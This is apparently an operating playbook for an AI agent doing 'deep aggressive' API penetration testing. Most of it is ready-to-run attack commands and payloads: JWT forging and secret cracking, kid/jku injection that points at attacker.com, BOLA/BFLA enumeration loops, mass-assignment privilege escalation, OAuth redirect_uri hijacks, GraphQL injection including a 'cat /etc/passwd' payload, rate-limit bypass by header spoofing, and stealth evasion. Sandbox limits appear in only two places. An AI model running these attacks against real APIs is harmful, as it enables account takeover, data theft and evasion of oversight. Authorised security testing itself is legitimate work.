# Skill Playbook: api-testing-agent — DEEP AGGRESSIVE MODE

> **Purpose:** Authoritative deep-aggressive-mode operating procedures for API security testing. Every phase embeds skill-library technique chains from `skills/api-security/*` and `skills/graphql/skill-playbook.md`. Run each phase to completion before closing an endpoint.

## Phase 1 — API Discovery & Schema Collection

1. **Endpoint Discovery** — `kiterunner scan <target> -w /usr/share/wordlists/raft-large-apis.txt -x 50`. Sweep common paths in parallel with curl: `/swagger.json`, `/api-docs`, `/openapi.json`, `/v2/api-docs`, `/v3/api-docs`, `/swagger-ui.html`, `/swagger-ui/index.html`, `/graphql`, `/graphiql`, `/gql`, `/query`, `/actuator`, `/actuator/env`, `/actuator/configprops`, `/.env`, `/config.js`.
2. **Version Inventory** — Map every API version prefix: `/api`, `/api/v1`, `/api/v2`, `/v1`, `/v2`, `/api/v3`, `/api/internal`, `/api/admin`, `/api/staging`, `/api/debug`. Old versions are rarely re-tested when new versions ship — they are your highest-value targets.
3. **Parameter Discovery** — `arjun -u <target/api/endpoint> -m JSON -T 10` for hidden body parameters; run against the same endpoint across versions.
4. **Schema Collection** — Fetch and save OpenAPI specs: `curl -s https://target.com/v3/api-docs | jq '.components.securitySchemes, .security'`. Export Swagger UI to Postman collection via "Import from spec" for Newman regression runs.
5. **GraphQL Introspection** — `inql -t <target/graphql>` or curl the full `IntrospectionQuery`. If introspection is blocked, run `clairvoyance -u <endpoint> -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -o schema.json` and field-suggestion probing: `query { user { xyz } }` returns "Did you mean" hints.
6. **Endpoint Classification** — Classify endpoints into auth, CRUD, admin, file operations, webhook, debug, and health categories. Mark every endpoint that the front-end does not call — these bypass front-end controls.

## Phase 2 — Specification-Based Testing

1. **Schemathesis** — `schemathesis run --checks all <openapi-spec-url>` for stateful property testing; save all 4xx/5xx anomalies for manual review.
2. **42crunch** — Import OpenAPI spec and audit against 1000+ security rules; action every schema-level misconfiguration flagged.
3. **Newman** — Build an authorization matrix collection (role x endpoint x method) and run: `newman run matrix.json -e env.json --reporters cli,json`.
4. **nuclei** — `nuclei -u https://target.com/api -t ~/nuclei-templates/vulnerabilities/generic/jwt/ -jsonl jwt.jsonl` plus exposure templates for swagger/actuator.

## Phase 3 — JWT Attack Chain (skills/api-security/jwt-testing.md)

1. **Decode & Profile** — `echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .`. Inspect `alg`, `kid`, `jku`, `jwks`, `x5u`, `sub`, `exp`, `nbf`, `iat`, `jti`, `scope`/`role`. Fetch the public key: `curl -s https://target.com/.well-known/jwks.json`.
2. **Signature Validation Probe** — Send a token with the signature removed (`header.payload.`). 200 = signature not validated; 401 = validated. Document the baseline.
3. **alg none** — `jwt_tool <token> -X a`. Try case variants `None`, `NONE`, `nOnE` to bypass filters. Forge admin: `jwt_tool <token> -S hs256 -k SECRET -p '{"sub":"admin","role":"admin","exp":4102444800}'` after cracking.
4. **RS256 to HS256 Confusion** — Sign an HS256 token using the published RS256 public key as the HMAC secret: `python3 -c "import jwt, time; pub=open('public.pem','rb').read(); print(jwt.encode({'sub':'admin','role':'admin','exp':int(time.time())+3600}, pub, algorithm='HS256'))"`.
5. **Weak Secret Cracking** — `hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show`, `john jwt.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt`, and `jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt`. Re-sign forged tokens once the secret is known.
6. **kid Injection** — `jwt_tool <token> -X i -I -hc kid -hv ../../dev/null` with an empty-key HMAC signature; also test SQLi `"kid":"' UNION SELECT 'key'--"` and command injection variants.
7. **jku/jwks Injection** — Host an attacker JWKS and run `jwt_tool <token> -X k -ju "http://attacker.com/jwks.json"`. This doubles as an SSRF probe if the server fetches the jku URL.
8. **Claim Manipulation** — Swap `sub`/`role`/`scope`/`isAdmin`; set `exp` to far future (4102444800); remove `exp`; use type confusion `"exp":"0"`; duplicate claims `{"sub":"v","sub":"a"}` for parser-confusion bugs.
9. **Verify** — Every forged token replayed against the endpoint; record 401-vs-200 deltas. Sandbox-only validation.

## Phase 4 — BOLA / BFLA (skills/api-security/bola-bfla.md)

1. **Object Reference Mapping** — Hunt for user-controlled object references: `id`, `uid`, `user_id`, `account_id`, `order_id`, `file_id`, `post_id`, `transaction_id`, `uuid`, `guid` in path, query, JSON body, nested objects, and GraphQL args.
2. **Horizontal BOLA** — As user B, request user A's objects: `for id in $(seq 1000 1100); do curl -s -o /dev/null -w "%{http_code} $id\n" https://target.com/api/orders/$id -H "Authorization: Bearer <tokenB>"; done`. 200 returning A's data = confirmed.
3. **Write-path BOLA** — PATCH/PUT on another user's object: `curl -s -X PATCH https://target.com/api/orders/1000 -H "Authorization: Bearer <tokenB>" -H "Content-Type: application/json" -d '{"status":"cancelled","refund_amount":0}'`. Read-BOLA and write-BOLA are distinct findings.
4. **HTTP Method Escalation** — `curl -X PUT https://target.com/api/users/123/email`, `-X POST -d '{"role":"admin"}'`, `-X DELETE`, `-X OPTIONS -i`. Try override headers: `X-HTTP-Method-Override: PUT`, `X-Method-Override: PATCH`, `X-Original-Method: GET`.
5. **Path Normalization** — `/api/users/123`, `/api/users/123/`, `//api/users/123`, `/API/users/123`, trailing `%00`, case mutations, and URL-encoded traversal `%2e%2e%2f`.
6. **BFLA (Vertical)** — `for ep in admin users/roles audit debug export config health/stats internal; do curl -s -o /dev/null -w "%{http_code} /api/$ep\n" https://target.com/api/$ep -H "Authorization: Bearer <userToken>"; done`. 200/201 instead of 403 = confirmed. Probe hidden admin mutations discovered via schema/sourcemap.
7. **UUID & Batch Bypass** — Extract other UUIDs from responses (`jq '.customer_id, .payment_ref'`) and test them; use GraphQL aliases to test many IDs in one request.
8. **Account Takeover Chaining** — BOLA read `/api/users/{id}/tokens` -> BOLA write `/api/users/{id}/email` -> password reset to attacker inbox -> login as victim. Document as a chain.

## Phase 5 — Mass Assignment (skills/api-security/mass-assignment.md)

1. **Field Fuzzing** — For every POST/PUT/PATCH, inject privileged fields on top of a benign baseline: `for f in role isAdmin is_admin verified balance enabled plan status active admin staff is_superuser; do printf '{"nickname":"x","%s":true}\n' "$f" | curl -s -X PATCH https://target.com/api/users/123 -H "Authorization: Bearer <t>" -H "Content-Type: application/json" -d @- | rg -i "admin|role|true" && echo "HIT: $f"; done`.
2. **Self-Registration** — `curl -s -X POST https://target.com/api/register -H "Content-Type: application/json" -d '{"email":"hacker@evil.com","password":"Password1!","role":"admin","isAdmin":true,"balance":99999999}'`.
3. **Framework Fingerprint** — Map binding style (Rails `params[:user]`, Laravel `$request->all()`, Spring `@RequestBody`, Django ModelForm, Express `Object.assign`, .NET `[FromBody]`) to protected-parameter names; test alternate case/whitespace/unicode forms to bypass denylists.
4. **Nested/Alternate Formats** — `{"profile":{"role":"admin"},"org":{"plan":"enterprise"}}`; JSON:API style `{"data":{"attributes":{"is_staff":true}}}`; GraphQL mutation input objects with `role`, `isAdmin`, `password`.
5. **Confirm Persistence** — Verify the field persists via a follow-up GET; escalate through the admin endpoint if the role change took effect.

## Phase 6 — OAuth / SSO (skills/api-security/oauth-sso.md)

1. **Flow Identification** — Grep JS for `client_id`, `redirect_uri`, `response_type`, `oidc`; probe `/.well-known/openid-configuration`, `/oauth/authorize`, `/connect/authorize`, `/realms/{realm}/protocol/openid-connect/auth`.
2. **redirect_uri Manipulation** — Iterate: `https://attacker.com`, `https://target.com/callback.evil.com`, `https://target.com/callback@evil.com`, `https://evil.com/&redirect_uri=https://target.com/callback`, `https://evil.com#@target.com/callback`, `https://target.com.evil.com/callback`. Code delivered to attacker URL = confirmed.
3. **Open Redirect Chaining** — Find an open redirect on the same domain and register `redirect_uri=https://target.com/redirect?url=https://evil.com` so the code flows to the attacker.
4. **State / Login CSRF** — Remove `state` and complete the flow; if the callback accepts the code, login CSRF is possible. Replay a captured code to bind the victim's account to the attacker's session.
5. **Scope Escalation** — Request `scope=admin`, `offline_access`, `admin.read`; if the server grants more than the client is entitled to, use the elevated token against the API.
6. **PKCE Downgrade** — If the server does not enforce PKCE, strip `code_challenge`/`code_verifier` and exchange the code without the verifier.
7. **Code Replay & Weak Entropy** — Replay a single-use code; brute sequential/weak codes with a loop. Device-code flow: initiate `urn:ietf:params:oauth:grant-type:device_code`, phish the user_code, poll the token endpoint.

## Phase 7 — GraphQL Attacks (skills/api-security/graphql-testing.md, skills/graphql/skill-playbook.md)

1. **Introspection & Schema Mining** — Dump schema; hunt sensitive fields (`password`, `token`, `ssn`, `secret`, `role`, `isAdmin`), deprecated fields, and undocumented mutations. Bypass disabled introspection with fragments, aliases, and `clairvoyance`.
2. **Batching Attack** — `[{"query":"query { user(id: 1) { email passwordHash } }"},{"query":"query { user(id: 2) { email } }"}]` to bypass per-request rate limits and enumerate records.
3. **Alias Rate-Limit Bypass** — `mutation { a: login(username:"admin",password:"pass1"){token} b: login(...){token} ... z: ... }` for single-request brute-force attempts.
4. **Deep Recursion / Circular DoS** — Nested `friends { user { friends { ... } } }` and `__type(name:"__type")` circular queries; measure response time and load at increasing depth. Do not run sustained DoS against production.
5. **Injection in Resolvers** — SQLi `user(id: "1' OR '1'='1")`, NoSQLi `credentials: "{ \"$ne\": null }"`, command injection in mutation args like `downloadReport(format: "pdf; cat /etc/passwd")`. Verify with response diff, timing, or OOB callback.
6. **IDOR via Args** — `query { mine: user(id: 1) { email } theirs: user(id: 2) { email } }`; batch numeric IDs even when REST IDs are opaque.
7. **Error Disclosure** — `mutation { login(username: null, password: null) { token } }`; inspect errors for stack traces, raw SQL, internal variable names, file paths, connection strings.
8. **Auth Bypass** — Send queries unauthenticated; test elevation-requiring mutations (`deleteUser`, `updateRole`, `createAdmin`); try GET-based queries to bypass POST-body WAFs and poison caches; test subscriptions for real-time leaks.

## Phase 8 — Rate Limiting & Resource Exhaustion

1. **Threshold Measurement** — Send rapid sequential requests; record the exact threshold (requests per window) and the response code/header used.
2. **Bypass Vectors** — Spoof `X-Forwarded-For`, `X-Real-IP`, `X-Original-IP`, `CF-Connecting-IP`; rotate per-request; use header arrays `X-Forwarded-For: a, b, c`; append benign query params; lowercase/mixed-case the path; GET-vs-POST swaps; HTTP/1.0 vs 1.1; GraphQL batching and aliases.
3. **Resource Exhaustion** — Large payloads, pagination manipulation (`?page=99999`, `limit=-1`, huge `per_page`), expensive nested GraphQL fields, and slow-body requests.

## Phase 9 — API Versioning & Misconfiguration Abuse

1. **Version Enumeration** — Diff behavior across `/api/v1` and `/api/v2` for the same resource; old versions often lack authz checks, rate limits, or input validation applied to the new version.
2. **Deprecated Endpoint Abuse** — Locate undocumented deprecated routes (from schema diffs, sourcemaps, backup files, `_old`, `_v1`, `_bak` suffixes) and probe them for removed security controls.
3. **Swagger/OpenAPI Exposure** — Confirm reachable `/swagger-ui.html`, `/v2/api-docs`, `/v3/api-docs`; harvest operation IDs, auth schemes, and deprecated endpoints for targeting.
4. **Error Message Enumeration** — Send malformed bodies (`curl -X POST ... -d '{'`), invalid JSON types, oversized values, and duplicate keys; log every stack trace, SQL query, framework version, and internal hostname leaked.
5. **Content-Type Confusion** — Resend JSON bodies as `application/x-www-form-urlencoded`, `text/plain`, `multipart/form-data`, `application/xml`; parameter pollution `?id=1&id=2`.

## Phase 10 — Evasion & Deep Aggressive Execution

1. **ID Fuzzing at Scale** — `ffuf -u https://target.com/api/orders/FUZZ -w <(seq 1 5000) -fs 57 -fc 403,404 -H "Authorization: Bearer <tokenB>"` and Turbo Intruder for high-concurrency iteration.
2. **Stealth Posture** — Rotate user-agent and header order between requests; throttle bursts below detection thresholds; avoid hammering error endpoints in bursts.
3. **Chain Persistence** — Verify each chain step with an independent request method (curl, Burp, Postman) to eliminate tool artifacts.
4. **Coverage Gate** — Before closing any endpoint, confirm the checklist is complete: schema/version enumerated, JWT matrix run, BOLA read+write across two contexts, BFLA on admin functions, mass-assignment fuzz on all mutating verbs, GraphQL introspection+batching+depth tested (if applicable), OAuth flows tested (if present), rate-limit threshold measured, version diff checked, error enumeration captured.

## Phase 11 — Verification & Evidence

1. **Two-Context Proof** — Every authz finding replayed with two distinct roles/tokens; capture both responses.
2. **Independent Reproduction** — Re-run each PoC with a second tool (Burp Repeater after curl, or vice versa).
3. **False Positive Log** — Record tool-reported findings that did not reproduce, with the reason.
4. **Confidence Tags** — `confirmed` (two-context manual PoC), `likely` (single-context PoC), `tentative` (tool-only).
5. **Sandbox Constraints** — Forged tokens and cracked secrets validated against sandbox API only; no production tokens cracked or replayed; no production objects modified or deleted; destructive API calls never executed against live systems.
6. **Handoff** — Package findings YAML with full PoC curl chains, CVSS vectors, OWASP API category, and remediation; route exploit chains to exploit-poc-agent and hardcoded keys to secrets-scanning-agent.
